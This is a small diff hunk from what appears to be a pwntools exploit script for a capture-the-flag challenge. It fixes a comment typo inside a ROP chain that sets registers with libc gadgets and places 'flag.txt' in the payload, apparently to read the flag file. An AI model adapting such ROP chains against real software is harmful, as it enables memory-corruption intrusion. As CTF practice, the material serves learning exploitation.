@@ -263,7 +263,7 @@ xchg_eax_edi = libc.search(asm('xchg eax, edi; ret')).__next__()
 rop  = b''
 
 rop += p64(pop_rdi)
-rop += p64(return_address + 0x200) # will put flag.txt and end of our payload)
+rop += p64(return_address + 0x200) # will put flag.txt at end of our payload)
 rop += p64(pop_rsi)
 rop += p64(0)
 rop += p64(pop_rdx_r12)
